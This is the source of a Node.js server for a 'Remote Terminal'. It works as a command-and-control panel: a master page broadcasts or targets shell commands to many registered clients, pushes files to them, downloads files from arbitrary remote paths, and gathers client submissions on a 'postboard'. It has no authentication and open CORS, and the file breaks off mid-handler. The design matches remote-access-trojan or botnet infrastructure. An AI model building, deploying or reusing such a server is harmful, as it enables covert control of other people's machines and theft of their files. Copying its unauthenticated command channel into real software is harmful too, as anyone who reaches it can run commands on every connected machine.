const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  transports: ['websocket', 'polling'],
  cors: { origin: "*", methods: ["GET", "POST"] },
  pingInterval: 25000,
  pingTimeout: 60000
});

app.set('trust proxy', 1);

// ---------- Body parsing + CORS (for /submission) ----------
app.use(express.json({ limit: '50mb' }));
app.use(express.text({ limit: '50mb' }));
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, X-Client-UUID');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// ---------- Existing state ----------
const clients = new Map();          // uuid -> { socket, cwd, env, epoch }
const viewers = new Map();          // uuid -> Set of sockets
const masters = new Set();          // Set of sockets
const clientHeartbeats = new Map(); // uuid -> lastHeartbeat ts

// ---------- Postboard state ----------
const SUBMISSIONS_PATH = path.join(__dirname, 'submissions.json');
let submissions = [];
let submissionCounter = 0;

function loadSubmissions() {
  try {
    if (!fs.existsSync(SUBMISSIONS_PATH)) return;
    const raw = fs.readFileSync(SUBMISSIONS_PATH, 'utf8');
    const arr = JSON.parse(raw);
    if (Array.isArray(arr)) {
      submissions = arr;
      arr.forEach(s => {
        if (typeof s.id === 'number' && s.id > submissionCounter) {
          submissionCounter = s.id;
        }
      });
      console.log(`[Postboard] Loaded ${submissions.length} submission(s)`);
    }
  } catch (err) {
    console.error('[Postboard] Failed to load submissions:', err.message);
  }
}

function saveSubmissions() {
  try {
    const tmp = SUBMISSIONS_PATH + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(submissions, null, 2));
    fs.renameSync(tmp, SUBMISSIONS_PATH);
  } catch (err) {
    console.error('[Postboard] Failed to save submissions:', err.message);
  }
}

loadSubmissions();

// ---------- public-server/index.html (the big UI) ----------
const publicDir = path.join(__dirname, 'public-server');
if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });

const indexHtml = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Remote Terminal</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; background: #121212; color: #eee; font-family: 'Courier New', monospace; }
    body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }

    /* ================= POSTBOARD (top bar + panel) ================= */
    #postboardBar {
      flex: 0 0 auto;
      background: #1a1a1a;
      border-bottom: 1px solid #333;
      padding: 8px 15px;
      display: flex;
      gap: 8px;
      align-items: center;
      z-index: 1500;
    }
    #postboardBar input {
      flex: 1;
      background: #0a0a0a;
      border: 1px solid #333;
      color: #eee;
      padding: 6px 10px;
      border-radius: 4px;
      font-family: 'Courier New', monospace;
      font-size: 12px;
    }
    #postboardBar input:focus { outline: 1px solid #0f08; }
    #postboardBar button {
      background: #2a2a2a;
      color: #eee;
      border: 1px solid #333;
      padding: 6px 10px;
      border-radius: 4px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-size: 11px;
      white-space: nowrap;
    }
    #postboardBar button:hover { background: #3a3a3a; }
    #postboardBar .badge {
      background: #0f02;
      color: #5f5;
      border: 1px solid #0f08;
      padding: 3px 6px;
      border-radius: 3px;
      font-size: 10px;
      font-weight: bold;
      white-space: nowrap;
    }

    #postboardPanel {
      flex: 0 0 auto;
      max-height: 30vh;
      overflow-y: auto;
      background: #161616;
      border-bottom: 1px solid #333;
      padding: 8px 15px;
      display: none;
    }
    #postboardPanel.visible { display: block; }

    .submission-item {
      border: 1px solid #2a2a2a;
      border-radius: 4px;
      margin-bottom: 8px;
      padding: 8px;
      background: #0d0d0d;
    }
    .submission-header {
      color: #5f5;
      font-size: 11px;
      margin-bottom: 4px;
      word-break: break-all;
    }
    .submission-body {
      color: #ddd;
      font-size: 11px;
      white-space: pre-wrap;
      word-break: break-all;
      max-height: 200px;
      overflow-y: auto;
      background: #050505;
      padding: 4px;
      border-radius: 3px;
    }
    .submission-empty { color: #888; font-size: 12px; }

    /* ================= TERMINAL ================= */
    #terminal {
      flex: 1 1 auto;
      min-height: 0;
      padding: 15px;
      overflow-y: auto;
      white-space: pre-wrap;
      font-size: 13px;
      line-height: 1.4;
    }
    #inputLine {
      flex: 0 0 auto;
      background: #1a1a1a;
      padding: 8px 15px;
      border-top: 1px solid #333;
    }
    #cmd {
      width: 100%;
      background: transparent;
      border: none;
      color: #0f0;
      font-family: 'Courier New', monospace;
      font-size: 13px;
    }
    #cmd:focus { outline: none; }

    /* ================= existing terminal styling ================= */
    .output { margin: 2px 0; display: flex; gap: 8px; align-items: flex-start; }
    .error { color: #f55; }
    .system { color: #3af; }
    .command { color: #5f5; }
    .lineCheckbox { margin-top: 2px; cursor: pointer; }
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: #1a1a1a; }
    ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: #666; }

    #controlBar {
      position: fixed; right: 12px; bottom: 72px;
      background: #1a1a1a; border: 1px solid #333;
      padding: 10px; border-radius: 6px;
      display: flex; flex-direction: column; gap: 6px;
      z-index: 1000; color: #ddd; font-size: 12px;
      min-width: 280px; max-width: 360px;
    }
    #selectedList { max-width: 340px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; word-break: break-all; }
    button { background: #2a2a2a; color: #eee; border: 1px solid #333; padding: 6px 8px; border-radius: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 11px; }
    button:hover { background: #3a3a3a; }
    .modeToggle { display: flex; gap: 4px; align-items: center; flex-wrap: wrap; }
    .modeToggle label { display: flex; align-items: center; gap: 4px; cursor: pointer; }
    .modeToggle input[type="radio"] { accent-color: #0f0; cursor: pointer; }
    .modeLabel { font-weight: bold; }
    .mode-none { color: #aaa; }
    .mode-include { color: #5f5; }
    .mode-exclude { color: #f55; }
    .mode-indicator { padding: 2px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; }
    .mode-indicator.none { background: #aaa2; color: #aaa; border: 1px solid #aaa8; }
    .mode-indicator.include { background: #0f02; color: #5f5; border: 1px solid #0f08; }
    .mode-indicator.exclude { background: #f002; color: #f55; border: 1px solid #f008; }
    .selectedInfo { color: #888; font-size: 10px; }
    .line-highlight { background: #ffffff08; }

    /* file transfer */
    #fileSection { border-bottom: 1px solid #333; padding-bottom: 6px; margin-bottom: 2px; }
    .file-label { color: #aaa; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 3px; }
    .file-row { display: flex; gap: 4px; align-items: center; margin-bottom: 4px; }
    .file-row input[type="file"] { font-family: 'Courier New', monospace; font-size: 10px; color: #ddd; width: 100%; }
    .file-row input[type="file"]::-webkit-file-upload-button { background: #2a2a2a; color: #eee; border: 1px solid #333; padding: 4px 6px; border-radius: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 10px; }
    .file-row input[type="file"]::-webkit-file-upload-button:hover { background: #3a3a3a; }
    .file-row input[type="text"] { flex: 1; background: #0a0a0a; border: 1px solid #333; color: #eee; padding: 4px 6px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 11px; }
    .file-btn { background: #1a3a1a; border: 1px solid #0f08; }
    .file-btn:hover { background: #2a5a2a; }
    .file-btn-small { padding: 4px 6px; font-size: 10px; }
    #fileProgress { position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); background: #1a1a1a; border: 1px solid #0f08; padding: 20px; border-radius: 8px; display: none; z-index: 2000; text-align: center; min-width: 320px; }
    #fileProgress .progress-label { margin-bottom: 8px; font-size: 13px; }
    #fileProgress .progress-bar-bg { width: 100%; height: 14px; background: #2a2a2a; border-radius: 7px; overflow: hidden; }
    #fileProgress .progress-bar-fill { height: 100%; width: 0%; background: #0f0; border-radius: 7px; transition: width 0.3s; }
    #fileProgress .progress-pct { margin-top: 6px; font-size: 11px; color: #aaa; }
  </style>
</head>
<body>

  <!-- ================= POSTBOARD TOP BAR ================= -->
  <div id="postboardBar">
    <input id="postboardSearch" type="text"
           placeholder="Search submissions by client UUID (leave empty for all)…"
           autocomplete="off" spellcheck="false" />
    <button id="postboardSearchBtn">Search</button>
    <button id="postboardToggleBtn">Hide Postboard</button>
    <span class="badge" id="postboardCount">0</span>
  </div>
  <div id="postboardPanel" class="visible">
    <div id="postboardList"><div class="submission-empty">Loading…</div></div>
  </div>

  <!-- ================= TERMINAL ================= -->
  <div id="terminal"></div>

  <!-- ================= RIGHT CONTROL BAR ================= -->
  <div id="controlBar" title="Selection & File Controls">
    <div id="fileSection">
      <div class="file-label">Upload File to Client(s)</div><br>
      <div class="file-row">
        <input type="file" id="uploadFileInput" />
      </div><br>
      <div class="file-row">
        <button id="uploadBtn" class="file-btn file-btn-small" style="width:100%">Upload</button>
      </div><br>
      <div class="file-label" style="margin-top:4px">Download File from Client</div><br>
      <div class="file-row">
        <input type="text" id="downloadPath" placeholder="remote file path..." />
        <button id="downloadBtn" class="file-btn file-btn-small">Get</button>
      </div><br>
    </div>
    <div class="modeToggle">
      <span class="modeLabel">Mode:</span>
      <label><input type="radio" name="selMode" value="none" checked /> <span class="mode-none">None</span></label>
      <label><input type="radio" name="selMode" value="include" /> <span class="mode-include">Include</span></label>
      <label><input type="radio" name="selMode" value="exclude" /> <span class="mode-exclude">Exclude</span></label>
      <span id="modeBadge" class="mode-indicator none">NONE</span>
    </div>
    <div id="selectedList" class="selectedInfo">All clients targeted</div>
    <button id="clearBtn">Clear Selections</button>
  </div>

  <!-- ================= FILE PROGRESS OVERLAY ================= -->
  <div id="fileProgress">
    <div class="progress-label" id="progressLabel">Transferring...</div>
    <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
    <div class="progress-pct" id="progressPct">0%</div>
  </div>

  <!-- ================= COMMAND INPUT ================= -->
  <div id="inputLine">
    <input type="text" id="cmd" autocomplete="off" spellcheck="false" placeholder="Type command..." autofocus />
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    // ---------- hide postboard on non-master pages ----------
    var IS_MASTER = (window.location.pathname === '/master');
    if (!IS_MASTER) {
      document.getElementById('postboardBar').style.display = 'none';
      document.getElementById('postboardPanel').classList.remove('visible');
      document.getElementById('postboardPanel').style.display = 'none';
    }

    var socket = null;
    var terminal = document.getElementById('terminal');
    var input = document.getElementById('cmd');
    var selectedUUIDs = new Set();
    var excludedUUIDs = new Set();
    var selectionMode = 'none';
    var commandHistory = [];
    var historyIndex = -1;
    var lastCtrlClickedCheckbox = null;
    // File transfer state
    var downloadMeta = null;
    var pendingDownloadChunks = {};

    // ---------- mode toggle ----------
    document.querySelectorAll('input[name="selMode"]').forEach(function(radio) {
      radio.addEventListener('change', function(e) {
        if (!e.target.checked) return;
        selectionMode = e.target.value;
        var badge = document.getElementById('modeBadge');
        badge.textContent = selectionMode.toUpperCase();
        badge.className = 'mode-indicator ' + selectionMode;
        updateSelectedList();
        document.querySelectorAll('.lineCheckbox').forEach(function(cb) {
          cb.disabled = (selectionMode === 'none');
        });
      });
    });

    function updateSelectedList() {
      var el = document.getElementById('selectedList');
      if (selectionMode === 'none') {
        el.textContent = 'Mode: None — all clients targeted via normal input';
      } else if (selectionMode === 'include') {
        if (selectedUUIDs.size === 0) el.textContent = 'Selected (include): none — command will go nowhere';
        else el.textContent = 'Selected (include): ' + Array.from(selectedUUIDs).join(', ');
      } else {
        if (excludedUUIDs.size === 0) el.textContent = 'Excluded: none — all clients targeted';
        else el.textContent = 'Excluded: ' + Array.from(excludedUUIDs).join(', ');
      }
    }

    function getAllVisibleUUIDs() {
      var uuids = new Set();
      document.querySelectorAll('.lineCheckbox:not(:disabled)').forEach(function(cb) {
        if (cb.dataset.uuid) uuids.add(cb.dataset.uuid);
      });
      return uuids;
    }

    function getTargetUUIDs() {
      if (selectionMode === 'none') return null;
      if (selectionMode === 'include') return new Set(selectedUUIDs);
      var all = getAllVisibleUUIDs();
      excludedUUIDs.forEach(function(id) { all.delete(id); });
      return all;
    }

    function makeLineElement(text, cls) {
      var wrapper = document.createElement('div');
      wrapper.className = 'output';
      if (cls) wrapper.classList.add(cls);
      var uuidMatch = text.match(/^\\[([0-9a-fA-F-]{8,36})\\]/);
      var checkbox = document.createElement('input');
      checkbox.type = 'checkbox';
      checkbox.className = 'lineCheckbox';
      if (uuidMatch) {
        checkbox.dataset.uuid = uuidMatch[1];
        checkbox.disabled = (selectionMode === 'none');
        checkbox.addEventListener('change', function(e) {
          var id = e.target.dataset.uuid;
          if (selectionMode === 'include') {
            if (e.target.checked) selectedUUIDs.add(id); else selectedUUIDs.delete(id);
          } else if (selectionMode === 'exclude') {
            if (e.target.checked) excludedUUIDs.add(id); else excludedUUIDs.delete(id);
          }
          updateSelectedList();
        });
        checkbox.addEventListener('click', function(e) {
          if (e.ctrlKey || e.metaKey) {
            e.preventDefault();
            var currentCb = e.target;
            if (lastCtrlClickedCheckbox && lastCtrlClickedCheckbox !== currentCb) {
              var allCheckboxes = Array.from(document.querySelectorAll('.lineCheckbox:not(:disabled)'));
              var startIdx = allCheckboxes.indexOf(lastCtrlClickedCheckbox);
              var endIdx = allCheckboxes.indexOf(currentCb);
              if (startIdx !== -1 && endIdx !== -1) {
                var lo = Math.min(startIdx, endIdx), hi = Math.max(startIdx, endIdx);
                for (var i = lo; i <= hi; i++) {
                  var cb = allCheckboxes[i];
                  var id = cb.dataset.uuid;
                  if (!id) continue;
                  cb.checked = true;
                  if (selectionMode === 'include') selectedUUIDs.add(id);
                  else if (selectionMode === 'exclude') excludedUUIDs.add(id);
                }
                updateSelectedList();
              }
            }
            lastCtrlClickedCheckbox = currentCb;
          } else {
            lastCtrlClickedCheckbox = null;
          }
        });
      } else {
        checkbox.disabled = true;
        checkbox.title = 'No UUID on this line';
      }
      var textDiv = document.createElement('div');
      textDiv.textContent = text;
      wrapper.appendChild(checkbox);
      wrapper.appendChild(textDiv);
      return wrapper;
    }

    function appendLine(text, cls) {
      var el = makeLineElement(text, cls);
      terminal.appendChild(el);
      terminal.scrollTop = terminal.scrollHeight;
    }

    function showProgress(label, pct) {
      document.getElementById('progressLabel').textContent = label;
      document.getElementById('progressFill').style.width = pct + '%';
      document.getElementById('progressPct').textContent = pct + '%';
      document.getElementById('fileProgress').style.display = 'block';
    }
    function hideProgress() {
      document.getElementById('fileProgress').style.display = 'none';
    }

    // ==================== POSTBOARD CLIENT LOGIC ====================
    function escapeHtml(s) {
      return String(s).replace(/[&<>"']/g, function(c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
      });
    }

    function renderSubmissions(list) {
      var el = document.getElementById('postboardList');
      var countEl = document.getElementById('postboardCount');
      el.innerHTML = '';
      countEl.textContent = (list ? list.length : 0) + ' submission' + ((list && list.length === 1) ? '' : 's');
      if (!list || list.length === 0) {
        var empty = document.createElement('div');
        empty.className = 'submission-empty';
        empty.textContent = 'No submissions found.';
        el.appendChild(empty);
        return;
      }
      var shown = list.slice(0, 100);
      shown.forEach(function(s) {
        var item = document.createElement('div');
        item.className = 'submission-item';

        var header = document.createElement('div');
        header.className = 'submission-header';
        var ts = new Date(s.timestamp).toLocaleString();
        header.textContent = '[' + s.uuid + '] ' + (s.filename || '(no name)') +
                            ' — ' + ts + ' (' + s.size + ' bytes)';

        var body = document.createElement('pre');
        body.className = 'submission-body';
        var content = s.content || '';
        if (content.length > 2000) content = content.substring(0, 2000) + '\\n... [truncated]';
        body.textContent = content;

        item.appendChild(header);
        item.appendChild(body);
        el.appendChild(item);
      });
      if (list.length > shown.length) {
        var more = document.createElement('div');
        more.className = 'submission-empty';
        more.textContent = '... ' + (list.length - shown.length) + ' more not shown';
        el.appendChild(more);
      }
    }

    function fetchSubmissions(showPanel) {
      if (!IS_MASTER) return;
      var uuidInput = document.getElementById('postboardSearch');
      var uuid = uuidInput.value.trim();
      var url = uuid ? '/submissions?uuid=' + encodeURIComponent(uuid) : '/submissions';
      fetch(url).then(function(r) { return r.json(); }).then(function(data) {
        renderSubmissions(Array.isArray(data) ? data : []);
        if (showPanel) {
          document.getElementById('postboardPanel').classList.add('visible');
          document.getElementById('postboardToggleBtn').textContent = 'Hide Postboard';
        }
      }).catch(function(err) {
        appendLine('[System] Postboard fetch error: ' + err.message, 'error');
      });
    }

    if (IS_MASTER) {
      var searchInput = document.getElementById('postboardSearch');
      searchInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') fetchSubmissions(true);
        if (e.key === 'Escape') { searchInput.value = ''; fetchSubmissions(true); }
      });
      document.getElementById('postboardSearchBtn').addEventListener('click', function() {
        fetchSubmissions(true);
      });
      document.getElementById('postboardToggleBtn').addEventListener('click', function() {
        var panel = document.getElementById('postboardPanel');
        var nowVisible = panel.classList.toggle('visible');
        this.textContent = nowVisible ? 'Hide Postboard' : 'Show Postboard';
        if (nowVisible) fetchSubmissions(false);
      });
      // initial load
      fetchSubmissions(false);
    }

    // ---------- socket setup ----------
    socket = io({
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      reconnectionAttempts: Infinity
    });

    socket.on('connect', function() {
      appendLine('[System] Connected to server', 'system');
      var pathName = window.location.pathname;
      if (pathName === '/master') {
        socket.emit('register-master');
      } else {
        var uuid = (pathName || '/').substring(1);
        if (uuid && uuid !== '') {
          socket.emit('register-viewer', uuid);
        }
      }
    });

    socket.on('connect_error', function(error) {
      appendLine('[System] Connection error: ' + (error.message || 'Unknown error'), 'error');
    });
    socket.on('disconnect', function(reason) {
      appendLine('[System] Disconnected from server: ' + reason, 'error');
    });
    socket.on('output', function(data) { appendLine(data); });
    socket.on('error', function(data) { appendLine(data, 'error'); });
    socket.on('system', function(data) { appendLine(data, 'system'); });
    socket.on('command', function(data) { appendLine('> ' + data, 'command'); });
    socket.on('directory', function(dir) { document.title = 'Remote Terminal - ' + dir; });
    socket.on('registered', function(id) {
      appendLine('[System] Registered with ID: ' + id, 'system');
    });

    // ---------- live submissions ----------
    socket.on('new-submission', function(s) {
      appendLine('[System] New submission from ' + s.uuid +
                 ' (' + (s.filename || 'no name') + ', ' + s.size + ' bytes)', 'system');
      if (IS_MASTER && document.getElementById('postboardPanel').classList.contains('visible')) {
        var currentSearch = document.getElementById('postboardSearch').value.trim();
        if (!currentSearch || currentSearch === s.uuid) fetchSubmissions(false);
      }
    });

    // ---------- file download events ----------
    socket.on('download-start', function(meta) {
      downloadMeta = meta;
      pendingDownloadChunks = {};
      showProgress('Downloading: ' + meta.name, 0);
      appendLine('[System] Starting download of "' + meta.name + '" (' + meta.size + ' bytes)', 'system');
    });

    socket.on('download-chunk', function(data) {
      if (!downloadMeta) return;
      pendingDownloadChunks[data.index] = data.chunk;
      var received = Object.keys(pendingDownloadChunks).length;
      var pct = Math.round((received / downloadMeta.totalChunks) * 100);
      showProgress('Downloading: ' + downloadMeta.name, Math.min(pct, 99));
    });

    socket.on('download-end', function() {
      if (!downloadMeta) return;
      hideProgress();
      var binary = '';
      for (var i = 0; i < downloadMeta.totalChunks; i++) {
        if (pendingDownloadChunks[i]) binary += pendingDownloadChunks[i];
      }
      try {
        var byteChars = atob(binary);
        var bytes = new Uint8Array(byteChars.length);
        for (var j = 0; j < byteChars.length; j++) bytes[j] = byteChars.charCodeAt(j);
        var blob = new Blob([bytes]);
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = downloadMeta.name;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        setTimeout(function() { URL.revokeObjectURL(url); }, 10000);
        appendLine('[System] Downloaded "' + downloadMeta.name + '" (' + downloadMeta.size + ' bytes)', 'system');
      } catch (e) {
        appendLine('[System] Download reassembly error: ' + e.message, 'error');
      }
      downloadMeta = null;
      pendingDownloadChunks = {};
    });

    socket.on('download-error', function(msg) {
      hideProgress();
      appendLine('[System] Download error: ' + msg, 'error');
      downloadMeta = null;
      pendingDownloadChunks = {};
    });

    // ---------- upload events ----------
    socket.on('upload-complete', function(data) {
      hideProgress();
      appendLine('[System] Uploaded "' + data.name + '" to client(s) (' + data.size + ' bytes)', 'system');
    });
    socket.on('upload-error', function(msg) {
      hideProgress();
      appendLine('[System] Upload error: ' + msg, 'error');
    });
    socket.on('upload-progress', function(data) {
      showProgress('Uploading: ' + data.name, data.pct);
    });

    // ---------- command input ----------
    input.addEventListener('keydown', function(evt) {
      if (!socket || !socket.connected) return;
      if (evt.key === 'Enter') {
        var val = input.value.trim();
        if (val) {
          var targets = getTargetUUIDs();
          if (targets === null) {
            socket.emit('command', val);
          } else if (targets.size > 0) {
            socket.emit('targeted-command', { uuids: Array.from(targets), cmd: val });
            appendLine('[System] Sent targeted command to ' + targets.size + ' client(s): ' + val, 'system');
          } else {
            appendLine('[System] No target clients selected — command not sent', 'error');
          }
          commandHistory.push(val);
          historyIndex = commandHistory.length;
        }
        input.value = '';
      } else if (evt.key === 'ArrowUp') {
        evt.preventDefault();
        if (commandHistory.length && historyIndex > 0) {
          historyIndex--;
          input.value = commandHistory[historyIndex];
        }
      } else if (evt.key === 'ArrowDown') {
        evt.preventDefault();
        if (commandHistory.length && historyIndex < commandHistory.length - 1) {
          historyIndex++;
          input.value = commandHistory[historyIndex];
        } else {
          historyIndex = commandHistory.length;
          input.value = '';
        }
      }
    });

    document.getElementById('clearBtn').addEventListener('click', function() {
      selectedUUIDs.clear();
      excludedUUIDs.clear();
      document.querySelectorAll('.lineCheckbox').forEach(function(cb) { cb.checked = false; });
      lastCtrlClickedCheckbox = null;
      updateSelectedList();
    });

    // ---------- upload handler ----------
    document.getElementById('uploadBtn').addEventListener('click', function() {
      var fileInput = document.getElementById('uploadFileInput');
      if (!fileInput.files || fileInput.files.length === 0) {
        appendLine('[System] No file selected for upload', 'error');
        return;
      }
      var file = fileInput.files[0];
      var targets = getTargetUUIDs();
      var reader = new FileReader();
      reader.onload = function(e) {
        var base64 = e.target.result.split(',')[1];
        var chunkSize = 64 * 1024;
        var totalChunks = Math.ceil(base64.length / chunkSize);
        var uploadId = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
        var meta = {
          uploadId: uploadId,
          name: file.name,
          size: file.size,
          totalChunks: totalChunks,
          chunkSize: chunkSize,
          targets: targets ? Array.from(targets) : null
        };
        socket.emit('upload-start', meta);
        var sent = 0;
        function sendNext() {
          if (sent >= totalChunks) {
            socket.emit('upload-end', { uploadId: uploadId, targets: targets ? Array.from(targets) : null });
            return;
          }
          var chunk = base64.substring(sent * chunkSize, (sent + 1) * chunkSize);
          socket.emit('upload-chunk', {
            uploadId: uploadId, index: sent, chunk: chunk,
            targets: targets ? Array.from(targets) : null
          });
          sent++;
          var pct = Math.round((sent / totalChunks) * 100);
          showProgress('Uploading: ' + file.name, pct);
          setTimeout(sendNext, 10);
        }
        sendNext();
      };
      reader.readAsDataURL(file);
    });

    // ---------- download handler ----------
    document.getElementById('downloadBtn').addEventListener('click', function() {
      var remotePath = document.getElementById('downloadPath').value.trim();
      if (!remotePath) {
        appendLine('[System] No remote path specified for download', 'error');
        return;
      }
      var targets = getTargetUUIDs();
      if (targets === null) {
        socket.emit('download-request', { path: remotePath, targets: null });
        appendLine('[System] Requested download of "' + remotePath + '" from first available client', 'system');
      } else if (targets.size > 0) {
        var targetArr = Array.from(targets);
        socket.emit('download-request', { path: remotePath, targets: targetArr });
        appendLine('[System] Requested download of "' + remotePath + '" from ' + targetArr.length + ' client(s)', 'system');
      } else {
        appendLine('[System] No target clients selected for download', 'error');
      }
    });

    // initial state
    document.querySelectorAll('.lineCheckbox').forEach(function(cb) { cb.disabled = true; });
    updateSelectedList();
  </script>
</body>
</html>`;

fs.writeFileSync(path.join(publicDir, 'index.html'), indexHtml);

// =====================================================
// ================= POSTBOARD ROUTES ==================
// =====================================================

// POST /submission — main endpoint for send.js
app.post('/submission', (req, res) => {
  var body = req.body;
  var uuid, content, filename;

  if (typeof body === 'string') {
    // text/plain body — uuid from query or header
    uuid = (req.query.uuid || req.headers['x-client-uuid'] || '').toString().trim();
    content = body;
    filename = (req.query.filename || '').toString() || null;
  } else if (body && typeof body === 'object') {
    uuid = (body.uuid || '').toString().trim();
    content = body.content;
    filename = body.filename ? String(body.filename) : null;
  }

  if (!uuid || typeof uuid !== 'string') {
    return res.status(400).json({ error: 'Missing or invalid uuid' });
  }
  if (typeof content !== 'string') {
    return res.status(400).json({ error: 'Missing content (must be a string)' });
  }
  if (content.length === 0) {
    return res.status(400).json({ error: 'Empty content' });
  }
  if (content.length > 40 * 1024 * 1024) {
    return res.status(413).json({ error: 'Content too large (max 40 MB)' });
  }

  var submission = {
    id: ++submissionCounter,
    uuid: uuid,
    content: content,
    filename: filename,
    size: Buffer.byteLength(content, 'utf8'),
    timestamp: Date.now()
  };

  submissions.push(submission);
  saveSubmissions();

  // Notify the submitting client's viewers
  var vset = viewers.get(uuid);
  if (vset) vset.forEach(function(s) { s.emit('new-submission', submission); });
  // Notify masters
  masters.forEach(function(ms) { ms.emit('new-submission', submission); });

  console.log('[Postboard] Submission #' + submission.id + ' from ' + uuid +
              ' (' + (filename || 'no name') + ', ' + submission.size + ' bytes)');

  res.json({ success: true, id: submission.id, size: submission.size });
});

// GET /submission — usage info
app.get('/submission', (req, res) => {
  res.type('text/plain').send(
    'Remote Terminal — Postboard submission endpoint\n' +
    '\n' +
    'POST application/json:\n' +
    '  { "uuid": "<uuid>", "content": "<text>", "filename": "<optional>" }\n' +
    '\n' +
    'POST text/plain:\n' +
    '  body = raw text; uuid from ?uuid=<uuid> or X-Client-UUID header\n' +
    '\n' +
    'Example (from the client directory):\n' +
    '  node send.js https://your-server/submission myfile.txt\n'
  );
});

// GET /submissions — list / filter by uuid
app.get('/submissions', (req, res) => {
  var uuid = (req.query.uuid || '').toString().trim();
  var result = uuid ? submissions.filter(function(s) { return s.uuid === uuid; }) : submissions.slice();
  result.sort(function(a, b) { return b.timestamp - a.timestamp; });
  var limit = parseInt(req.query.limit, 10);
  if (Number.isFinite(limit) && limit > 0) result = result.slice(0, limit);
  res.json(result);
});

// =====================================================
// ==================== PAGE ROUTES ====================
// =====================================================

app.get('/', (req, res) => {
  res.type('text/plain').send(
    'Remote Terminal Server\n\n' +
    'Master:  /master\n' +
    'Viewer:  /<client-uuid>\n' +
    'Post:    POST /submission\n' +
    'List:    GET /submissions?uuid=<uuid>\n'
  );
});

app.get('/master', (req, res) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

app.get('/:uuid', (req, res) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

// =====================================================
// ==================== SOCKET.IO ======================
// =====================================================

io.on('connection', (socket) => {
  let role = null;
  let clientId = null;

  // heartbeat from client
  socket.on('heartbeat', () => {
    if (clientId && clientHeartbeats.has(clientId)) {
      clientHeartbeats.set(clientId, Date.now());
    }
  });

  // ---------- CLIENT REGISTRATION (permanent UUID) ----------
  socket.on('register-client', (payload) => {
    role = 'client';
    const connectionEpoch = Date.now();

    // Accept BOTH: a string (legacy) OR { clientId, epoch } (current client)
    let oldId = null;
    if (typeof payload === 'string') {
      oldId = payload;
    } else if (payload && typeof payload === 'object') {
      oldId = (typeof payload.clientId === 'string' && payload.clientId.length > 0)
        ? payload.clientId
        : null;
    }

    // Validate UUID-ish string (8-128 chars, alnum + dash/underscore)
    const validOldId = (typeof oldId === 'string' && /^[A-Za-z0-9_-]{8,128}$/.test(oldId))
      ? oldId
      : null;

    if (validOldId) {
      const existing = clients.get(validOldId);
      if (existing && existing.socket && existing.socket.connected) {
        // Reconnect with a UUID that's currently connected — reuse it
        clientId = validOldId;
        existing.socket = socket;
        existing.epoch = connectionEpoch;
        existing.cwd = existing.cwd || (process.platform === 'win32'
          ? process.env.USERPROFILE || process.cwd()
          : process.cwd());
        console.log(`Client reconnected with existing UUID: ${clientId}`);
      } else {
        // Server may have restarted, OR stale entry — accept saved UUID as permanent
        clientId = validOldId;
        clients.set(clientId, {
          socket: socket,
          epoch: connectionEpoch,
          cwd: (process.platform === 'win32'
            ? process.env.USERPROFILE || process.cwd()
            : process.cwd()),
          env: {}
        });
        console.log(`Client registered with permanent UUID: ${clientId}`);
      }
      socket.emit('registered', clientId);
    } else {
      // First run (no saved UUID) — generate a new one
      clientId = uuidv4();
      clients.set(clientId, {
        socket: socket,
        epoch: connectionEpoch,
        cwd: (process.platform === 'win32'
          ? process.env.USERPROFILE || process.cwd()
          : process.cwd()),
        env: {}
      });
      console.log(`Client registered with new UUID: ${clientId}`);
      socket.emit('registered', clientId);
    }

    clientHeartbeats.set(clientId, Date.now());

    const clientData = clients.get(clientId);
    socket.emit('directory', clientData.cwd);

    // ---------- disconnection ----------
    socket.on('disconnect', () => {
      const current = clients.get(clientId);
      if (!current || current.epoch !== connectionEpoch) return;

      console.log(`Client ${clientId} disconnected`);
      clientHeartbeats.delete(clientId);

      const conns = viewers.get(clientId);
      if (conns) conns.forEach(s => s.emit('system', '[System] Client disconnected'));
      masters.forEach(ms => ms.emit('system', `[System] Client ${clientId} disconnected`));

      setTimeout(() => {
        const entry = clients.get(clientId);
        if (entry && entry.epoch === connectionEpoch && (!entry.socket || !entry.socket.connected)) {
          clients.delete(clientId);
          console.log(`Cleaned up stale client entry: ${clientId}`);
        }
      }, 60000);
    });

    // ---------- output / error / system / directory ----------
    socket.on('output', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('output', `[${clientId}] ${data}`));
      masters.forEach(ms => ms.emit('output', `[${clientId}] ${data}`));
    });

    socket.on('error', (data) => {
      const set = viewers.get(clientId);
